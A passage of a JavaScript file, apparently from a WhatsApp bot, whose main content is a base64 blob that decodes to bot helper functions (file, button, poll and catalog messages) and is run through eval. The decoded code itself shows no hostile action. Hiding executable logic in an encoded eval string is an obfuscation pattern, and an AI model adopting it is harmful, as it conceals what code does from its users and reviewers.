YXJzZShmaWxlLnRvU3RyaW5nKCkpIH0gfQpjYXRjaCAoZSkgeyBpZiAoZS5qc29uKSB0aHJvdyBlLmpzb24gfX0KbGV0IHR5cGUgPSAnJywgbWltZXR5cGUgPSBtaW1lLCBwYXRoRmlsZSA9IGZpbGVuYW1lCmlmIChvcHRpb25zLmFzRG9jdW1lbnQpIHR5cGUgPSAnZG9jdW1lbnQnCmlmIChvcHRpb25zLmFzU3RpY2tlciB8fCAvd2VicC8udGVzdChtaW1lKSkgewpsZXQgeyB3cml0ZUV4aWYgfSA9IHJlcXVpcmUoJy4vbGliL2V4aWYnKQpsZXQgbWVkaWEgPSB7IG1pbWV0eXBlOiBtaW1lLCBkYXRhIH0KcGF0aEZpbGUgPSBhd2FpdCB3cml0ZUV4aWYobWVkaWEsIHsgcGFja25hbWU6IG9wdGlvbnMucGFja25hbWUgPyBvcHRpb25zLnBhY2tuYW1lIDogZ2xvYmFsLnBhY2tuYW1lLCBhdXRob3I6IG9wdGlvbnMuYXV0aG9yID8gb3B0aW9ucy5hdXRob3IgOiBnbG9iYWwuYXV0aG9yLCBjYXRlZ29yaWVzOiBvcHRpb25zLmNhdGVnb3JpZXMgPyBvcHRpb25zLmNhdGVnb3JpZXMgOiBbXSB9KQphd2FpdCBmcy5wcm9taXNlcy51bmxpbmsoZmlsZW5hbWUpCnR5cGUgPSAnc3RpY2tlcicKbWltZXR5cGUgPSAnaW1hZ2Uvd2VicCd9CmVsc2UgaWYgKC9pbWFnZS8udGVzdChtaW1lKSkgdHlwZSA9ICdpbWFnZScKZWxzZSBpZiAoL3ZpZGVvLy50ZXN0KG1pbWUpKSB0eXBlID0gJ3ZpZGVvJwplbHNlIGlmICgvYXVkaW8vLnRlc3QobWltZSkpIHR5cGUgPSAnYXVkaW8nCmVsc2UgdHlwZSA9ICdkb2N1bWVudCcKYXdhaXQgTWVsaW9kYXMuc2VuZE1lc3NhZ2UoamlkLCB7IFt0eXBlXTogeyB1cmw6IHBhdGhGaWxlIH0sIGNhcHRpb24sIG1pbWV0eXBlLCBmaWxlTmFtZSwgLi4ub3B0aW9ucyB9LCB7IHF1b3RlZCwgLi4ub3B0aW9ucyB9KQpyZXR1cm4gZnMucHJvbWlzZXMudW5saW5rKHBhdGhGaWxlKX0KCk1lbGlvZGFzLnNlbmRUZXh0ID0gKGppZCwgdGV4dCwgcXVvdGVkID0gJycsIG9wdGlvbnMpID0+IE1lbGlvZGFzLnNlbmRNZXNzYWdlKGppZCwgeyB0ZXh0OiB0ZXh0LCAuLi5vcHRpb25zIH0sIHsgcXVvdGVkIH0pCgpNZWxpb2Rhcy5zZXJpYWxpemVNID0gKG0pID0+IHNtc2coTWVsaW9kYXMsIG0sIHN0b3JlKQoKTWVsaW9kYXMuYmVmb3JlID0gKHRla3MpID0+IHNtc2coTWVsaW9kYXMsIG0sIHN0b3JlKQoKTWVsaW9kYXMuc2VuZEJ1dHRvblRleHQgPSAoamlkLCBidXR0b25zID0gW10sIHRleHQsIGZvb3RlciwgcXVvdGVkID0gJycsIG9wdGlvbnMgPSB7fSkgPT4gewpsZXQgYnV0dG9uTWVzc2FnZSA9IHsKdGV4dCwKZm9vdGVyLApidXR0b25zLApoZWFkZXJUeXBlOiAyLAouLi5vcHRpb25zCn0KTWVsaW9kYXMuc2VuZE1lc3NhZ2UoamlkLCBidXR0b25NZXNzYWdlLCB7IHF1b3RlZCwgLi4ub3B0aW9ucyB9KQp9CgpNZWxpb2Rhcy5zZW5kS2F0YWxvZyA9IGFzeW5jIChqaWQgLCB0aXRsZSA9ICcnICwgZGVzYyA9ICcnLCBnYW0gLCBvcHRpb25zID0ge30pID0+ewpsZXQgbWVzc2FnZSA9IGF3YWl0IHByZXBhcmVXQU1lc3NhZ2VNZWRpYSh7IGltYWdlOiBnYW0gfSwgeyB1cGxvYWQ6IE1lbGlvZGFzLndhVXBsb2FkVG9TZXJ2ZXIgfSkKY29uc3QgdG9kID0gZ2VuZXJhdGVXQU1lc3NhZ2VGcm9tQ29udGVudChqaWQsCnsicHJvZHVjdE1lc3NhZ2UiOiB7CiJwcm9kdWN0IjogewoicHJvZHVjdEltYWdlIjogbWVzc2FnZS5pbWFnZU1lc3NhZ2UsCiJwcm9kdWN0SWQiOiAiOTk5OSIsCiJ0aXRsZSI6IHRpdGxlLAoiZGVzY3JpcHRpb24iOiBkZXNjLAoiY3VycmVuY3lDb2RlIjogIklOUiIsCiJwcmljZUFtb3VudDEwMDAiOiAiMTAwMDAwIiwKInVybCI6IGAke3dlYnNpdGV4fWAsCiJwcm9kdWN0SW1hZ2VDb3VudCI6IDEsCiJzYWxlUHJpY2VBbW91bnQxMDAwIjogIjAiCn0sCiJidXNpbmVzc093bmVySmlkIjogYCR7b3duZXJudW1iZXJ9QHMud2hhdHNhcHAubmV0YAp9Cn0sIG9wdGlvbnMpCnJldHVybiBNZWxpb2Rhcy5yZWxheU1lc3NhZ2UoamlkLCB0b2QubWVzc2FnZSwge21lc3NhZ2VJZDogdG9kLmtleS5pZH0pCn0gCgpNZWxpb2Rhcy5zZW5kNUJ1dExvYyA9IGFzeW5jIChqaWQgLCB0ZXh0ID0gJycgLCBmb290ZXIgPSAnJywgaW1nLCBidXQgPSBbXSwgb3B0aW9ucyA9IHt9KSA9PnsKdmFyIHRlbXBsYXRlID0gZ2VuZXJhdGVXQU1lc3NhZ2VGcm9tQ29udGVudChqaWQsIHByb3RvLk1lc3NhZ2UuZnJvbU9iamVjdCh7CnRlbXBsYXRlTWVzc2FnZTogewpoeWRyYXRlZFRlbXBsYXRlOiB7CiJoeWRyYXRlZENvbnRlbnRUZXh0IjogdGV4dCwKImxvY2F0aW9uTWVzc2FnZSI6IHsKImpwZWdUaHVtYm5haWwiOiBpbWcgfSwKImh5ZHJhdGVkRm9vdGVyVGV4dCI6IGZvb3RlciwKImh5ZHJhdGVkQnV0dG9ucyI6IGJ1dAp9Cn0KfSksIG9wdGlvbnMpCk1lbGlvZGFzLnJlbGF5TWVzc2FnZShqaWQsIHRlbXBsYXRlLm1lc3NhZ2UsIHsgbWVzc2FnZUlkOiB0ZW1wbGF0ZS5rZXkuaWQgfSkKfQpnbG9iYWwuQVBJID0gKG5hbWUsIHBhdGggPSAnLycsIHF1ZXJ5ID0ge30sIGFwaWtleXF1ZXJ5bmFtZSkgPT4gKG5hbWUgaW4gZ2xvYmFsLkFQSXMgPyBnbG9iYWwuQVBJc1tuYW1lXTogbmFtZSkgKyBwYXRoICsgKHF1ZXJ5IHx8IGFwaWtleXF1ZXJ5bmFtZSA/ICc/JyArIG5ldyBVUkxTZWFyY2hQYXJhbXMoT2JqZWN0LmVudHJpZXMoewogICAgLi4ucXVlcnksIC4uLihhcGlrZXlxdWVyeW5hbWUgPyB7CiAgICAgICAgW2FwaWtleXF1ZXJ5bmFtZV06IGdsb2JhbC5BUElLZXlzW25hbWUgaW4gZ2xvYmFsLkFQSXMgPyBnbG9iYWwuQVBJc1tuYW1lXTogbmFtZV0KICAgIH06IHt9KQp9KSk6ICcnKQoKTWVsaW9kYXMuc2VuZEJ1dEltZyA9IGFzeW5jIChqaWQsIHBhdGgsIHRla3MsIGZrZSwgYnV0KSA9PiB7CmxldCBpbWcgPSBCdWZmZXIuaXNCdWZmZXIocGF0aCkgPyBwYXRoIDogL15kYXRhOi4qP1wvLio/O2Jhc2U2NCwvaS50ZXN0KHBhdGgpID8gQnVmZmVyLmZyb20ocGF0aC5zcGxpdGAsYFsxXSwgJ2Jhc2U2NCcpIDogL15odHRwcz86XC9cLy8udGVzdChwYXRoKSA/IGF3YWl0IChhd2FpdCBnZXRCdWZmZXIocGF0aCkpIDogZnMuZXhpc3RzU3luYyhwYXRoKSA/IGZzLnJlYWRGaWxlU3luYyhwYXRoKSA6IEJ1ZmZlci5hbGxvYygwKQpsZXQgZmplamZqamplciA9IHsKaW1hZ2U6IGltZywgCmpwZWdUaHVtYm5haWw6IGltZywKY2FwdGlvbjogdGVrcywKZmlsZUxlbmd0aDogIjEiLApmb290ZXI6IGZrZSwKYnV0dG9uczogYnV0LApoZWFkZXJUeXBlOiA0LAp9Ck1lbGlvZGFzLnNlbmRNZXNzYWdlKGppZCwgZmplamZqamplciwgeyBxdW90ZWQ6IG0gfSkKfQoKICAgICAgICAgICAgLyoqCiAgICAgICAgICAgICAqIFNlbmQgTWVkaWEvRmlsZSB3aXRoIEF1dG9tYXRpYyBUeXBlIFNwZWNpZmllcgogICAgICAgICAgICAgKiBAcGFyYW0ge1N0cmluZ30gamlkCiAgICAgICAgICAgICAqIEBwYXJhbSB7U3RyaW5nfEJ1ZmZlcn0gcGF0aAogICAgICAgICAgICAgKiBAcGFyYW0ge1N0cmluZ30gZmlsZW5hbWUKICAgICAgICAgICAgICogQHBhcmFtIHtTdHJpbmd9IGNhcHRpb24KICAgICAgICAgICAgICogQHBhcmFtIHtpbXBvcnQoJ0BhZGl3YWpzaGluZy9iYWlsZXlzJykucHJvdG8uV2ViTWVzc2FnZUluZm99IHF1b3RlZAogICAgICAgICAgICAgKiBAcGFyYW0ge0Jvb2xlYW59IHB0dAogICAgICAgICAgICAgKiBAcGFyYW0ge09iamVjdH0gb3B0aW9ucwogICAgICAgICAgICAgKi8KTWVsaW9kYXMuc2VuZEZpbGUgPSBhc3luYyAoamlkLCBwYXRoLCBmaWxlbmFtZSA9ICcnLCBjYXB0aW9uID0gJycsIHF1b3RlZCwgcHR0ID0gZmFsc2UsIG9wdGlvbnMgPSB7fSkgPT4gewogIGxldCB0eXBlID0gYXdhaXQgTWVsaW9kYXMuZ2V0RmlsZShwYXRoLCB0cnVlKTsKICBsZXQgeyByZXMsIGRhdGE6IGZpbGUsIGZpbGVuYW1lOiBwYXRoRmlsZSB9ID0gdHlwZTsKCiAgaWYgKHJlcyAmJiByZXMuc3RhdHVzICE9PSAyMDAgfHwgZmlsZS5sZW5ndGggPD0gNjU1MzYpIHsKICAgIHRyeSB7CiAgICAgIHRocm93IHsKICAgICAgICBqc29uOiBKU09OLnBhcnNlKGZpbGUudG9TdHJpbmcoKSkKICAgICAgfTsKICAgIH0gY2F0Y2ggKGUpIHsKICAgICAgaWYgKGUuanNvbikgdGhyb3cgZS5qc29uOwogICAgfQogIH0KCiAgbGV0IG9wdCA9IHsKICAgIGZpbGVuYW1lCiAgfTsKCiAgaWYgKHF1b3RlZCkgb3B0LnF1b3RlZCA9IHF1b3RlZDsKICBpZiAoIXR5cGUpIG9wdGlvbnMuYXNEb2N1bWVudCA9IHRydWU7CgogIGxldCBtdHlwZSA9ICcnLAogICAgbWltZXR5cGUgPSB0eXBlLm1pbWUsCiAgICBjb252ZXJ0OwoKICBpZiAoL3dlYnAvLnRlc3QodHlwZS5taW1lKSB8fCAoL2ltYWdlLy50ZXN0KHR5cGUubWltZSkgJiYgb3B0aW9ucy5hc1N0aWNrZXIpKSBtdHlwZSA9ICdzdGlja2VyJzsKICBlbHNlIGlmICgvaW1hZ2UvLnRlc3QodHlwZS5taW1lKSB8fCAoL3dlYnAvLnRlc3QodHlwZS5taW1lKSAmJiBvcHRpb25zLmFzSW1hZ2UpKSBtdHlwZSA9ICdpbWFnZSc7CiAgZWxzZSBpZiAoL3ZpZGVvLy50ZXN0KHR5cGUubWltZSkpIG10eXBlID0gJ3ZpZGVvJzsKICBlbHNlIGlmICgvYXVkaW8vLnRlc3QodHlwZS5taW1lKSkgewogICAgY29udmVydCA9IGF3YWl0IChwdHQgPyB0b1BUVCA6IHRvQXVkaW8pKGZpbGUsIHR5cGUuZXh0KTsKICAgIGZpbGUgPSBjb252ZXJ0LmRhdGE7CiAgICBwYXRoRmlsZSA9IGNvbnZlcnQuZmlsZW5hbWU7CiAgICBtdHlwZSA9ICdhdWRpbyc7CiAgICBtaW1ldHlwZSA9ICdhdWRpby9vZ2c7IGNvZGVjcz1vcHVzJzsKICB9IGVsc2UgbXR5cGUgPSAnZG9jdW1lbnQnOwoKICBpZiAob3B0aW9ucy5hc0RvY3VtZW50KSBtdHlwZSA9ICdkb2N1bWVudCc7CgogIGRlbGV0ZSBvcHRpb25zLmFzU3RpY2tlcjsKICBkZWxldGUgb3B0aW9ucy5hc0xvY2F0aW9uOwogIGRlbGV0ZSBvcHRpb25zLmFzVmlkZW87CiAgZGVsZXRlIG9wdGlvbnMuYXNEb2N1bWVudDsKICBkZWxldGUgb3B0aW9ucy5hc0ltYWdlOwoKICBsZXQgbWVzc2FnZSA9IHsgLi4ub3B0aW9ucywgY2FwdGlvbiwgcHR0LCBbbXR5cGVdOiB7IHVybDogcGF0aEZpbGUgfSwgbWltZXR5cGUgfTsKICBsZXQgbTsKCiAgdHJ5IHsKICAgIG0gPSBhd2FpdCBNZWxpb2Rhcy5zZW5kTWVzc2FnZShqaWQsIG1lc3NhZ2UsIHsgLi4ub3B0LCAuLi5vcHRpb25zIH0pOwogIH0gY2F0Y2ggKGUpIHsKICAgIC8vY29uc29sZS5lcnJvcihlKQogICAgbSA9IG51bGw7CiAgfSBmaW5hbGx5IHsKICAgIGlmICghbSkgbSA9IGF3YWl0IE1lbGlvZGFzLnNlbmRNZXNzYWdlKGppZCwgeyAuLi5tZXNzYWdlLCBbbXR5cGVdOiBmaWxlIH0sIHsgLi4ub3B0LCAuLi5vcHRpb25zIH0pOwogICAgZmlsZSA9IG51bGw7CiAgICByZXR1cm4gbTsKICB9Cn0KTWVsaW9kYXMuZXYub24oJ2dyb3VwLXBhcnRpY2lwYW50cy51cGRhdGUnLCBhc3luYyAoYW51KSA9PiB7CmNvbnN0IHsgd2VsY29tZSB9ID0gcmVxdWlyZSAoJy4vbGliL3dlbGNvbWUnKQpjb25zdCBpc3dlbCA9IF93ZWxjb21lLmluY2x1ZGVzKGFudS5pZCkKY29uc3QgaXNMZWZ0ID0gX2xlZnQuaW5jbHVkZXMoYW51LmlkKQp3ZWxjb21lKGlzd2VsLCBpc0xlZnQsIE1lbGlvZGFzLCBhbnUpCn0pCgpNZWxpb2Rhcy5zZW5kRmlsZVVybCA9IGFzeW5jIChqaWQsIHVybCwgY2FwdGlvbiwgcXVvdGVkLCBvcHRpb25zID0ge30pID0+IHsKICAgICAgbGV0IG1pbWUgPSAnJzsKICAgICAgbGV0IHJlcyA9IGF3YWl0IGF4aW9zLmhlYWQodXJsKQogICAgICBtaW1lID0gcmVzLmhlYWRlcnNbJ2NvbnRlbnQtdHlwZSddCiAgICAgIGlmIChtaW1lLnNwbGl0KCIvIilbMV0gPT09ICJnaWYiKSB7CiAgICAgcmV0dXJuIE1lbGlvZGFzLnNlbmRNZXNzYWdlKGppZCwgeyB2aWRlbzogYXdhaXQgZ2V0QnVmZmVyKHVybCksIGNhcHRpb246IGNhcHRpb24sIGdpZlBsYXliYWNrOiB0cnVlLCAuLi5vcHRpb25zfSwgeyBxdW90ZWQ6IHF1b3RlZCwgLi4ub3B0aW9uc30pCiAgICAgIH0KICAgICAgbGV0IHR5cGUgPSBtaW1lLnNwbGl0KCIvIilbMF0rIk1lc3NhZ2UiCiAgICAgIGlmKG1pbWUgPT09ICJhcHBsaWNhdGlvbi9wZGYiKXsKICAgICByZXR1cm4gTWVsaW9kYXMuc2VuZE1lc3NhZ2UoamlkLCB7IGRvY3VtZW50OiBhd2FpdCBnZXRCdWZmZXIodXJsKSwgbWltZXR5cGU6ICdhcHBsaWNhdGlvbi9wZGYnLCBjYXB0aW9uOiBjYXB0aW9uLCAuLi5vcHRpb25zfSwgeyBxdW90ZWQ6IHF1b3RlZCwgLi4ub3B0aW9ucyB9KQogICAgICB9CiAgICAgIGlmKG1pbWUuc3BsaXQoIi8iKVswXSA9PT0gImltYWdlIil7CiAgICAgcmV0dXJuIE1lbGlvZGFzLnNlbmRNZXNzYWdlKGppZCwgeyBpbWFnZTogYXdhaXQgZ2V0QnVmZmVyKHVybCksIGNhcHRpb246IGNhcHRpb24sIC4uLm9wdGlvbnN9LCB7IHF1b3RlZDogcXVvdGVkLCAuLi5vcHRpb25zfSkKICAgICAgfQogICAgICBpZihtaW1lLnNwbGl0KCIvIilbMF0gPT09ICJ2aWRlbyIpewogICAgIHJldHVybiBNZWxpb2Rhcy5zZW5kTWVzc2FnZShqaWQsIHsgdmlkZW86IGF3YWl0IGdldEJ1ZmZlcih1cmwpLCBjYXB0aW9uOiBjYXB0aW9uLCBtaW1ldHlwZTogJ3ZpZGVvL21wNCcsIC4uLm9wdGlvbnN9LCB7IHF1b3RlZDogcXVvdGVkLCAuLi5vcHRpb25zIH0pCiAgICAgIH0KICAgICAgaWYobWltZS5zcGxpdCgiLyIpWzBdID09PSAiYXVkaW8iKXsKICAgICByZXR1cm4gTWVsaW9kYXMuc2VuZE1lc3NhZ2UoamlkLCB7IGF1ZGlvOiBhd2FpdCBnZXRCdWZmZXIodXJsKSwgY2FwdGlvbjogY2FwdGlvbiwgbWltZXR5cGU6ICdhdWRpby9tcGVnJywgLi4ub3B0aW9uc30sIHsgcXVvdGVkOiBxdW90ZWQsIC4uLm9wdGlvbnMgfSkKICAgICAgfQogICAgICB9CiAgICAgIAogICAgICAvKioKICAgICAqIAogICAgICogQHBhcmFtIHsqfSBqaWQgCiAgICAgKiBAcGFyYW0geyp9IG5hbWUgCiAgICAgKiBAcGFyYW0gWypdIHZhbHVlcyAKICAgICAqIEByZXR1cm5zIAogICAgICovCiAgICBNZWxpb2Rhcy5zZW5kUG9sbCA9IChqaWQsIG5hbWUgPSAnJywgdmFsdWVzID0gW10sIHNlbGVjdGFibGVDb3VudCA9IDEpID0+IHsgcmV0dXJuIE1lbGlvZGFzLnNlbmRNZXNzYWdlKGppZCwgeyBwb2xsOiB7IG5hbWUsIHZhbHVlcywgc2VsZWN0YWJsZUNvdW50IH19KSB9CgpyZXR1cm4gTWVsaW9kYXMKCn0KTmFuYXRzdU5vVGFpemFpKCkKCnByb2Nlc3Mub24oJ3VuY2F1Z2h0RXhjZXB0aW9uJywgZnVuY3Rpb24gKGVycikgewpjb25zb2xlLmxvZygnQ2F1Z2h0IGV4Y2VwdGlvbjogJywgZXJyKQp9KQo=')))")();
  eval(decode);
})();